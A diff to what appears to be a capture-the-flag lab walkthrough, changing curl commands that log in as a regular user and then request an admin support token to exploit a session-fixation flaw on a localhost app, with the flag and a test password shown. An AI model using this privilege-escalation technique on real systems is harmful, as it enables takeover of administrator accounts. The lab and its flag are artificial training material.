@@ -119,15 +119,14 @@ To retrieve the flag `OSS{s3ss10n_f1x4t10n_4tt4ck}`, follow these steps:
 You can also exploit this using curl:
 
 ```bash
-# Login as regular user first to get auth token
-curl -X POST http://localhost:3000/api/auth/login \
+# Login as regular user first to get the auth cookie
+curl -c cookies.txt -X POST http://localhost:3000/api/auth/login \
   -H "Content-Type: application/json" \
   -d '{"email":"alice@example.com","password":"iloveduck"}'
 
 # Generate support token for admin (session fixation)
-curl -X POST http://localhost:3000/api/user/support-access \
+curl -b cookies.txt -X POST http://localhost:3000/api/user/support-access \
   -H "Content-Type: application/json" \
-  -H "Authorization: Bearer <your_auth_token>" \
   -d '{"email":"admin@oss.com"}'
 
 # Use the support token to access admin
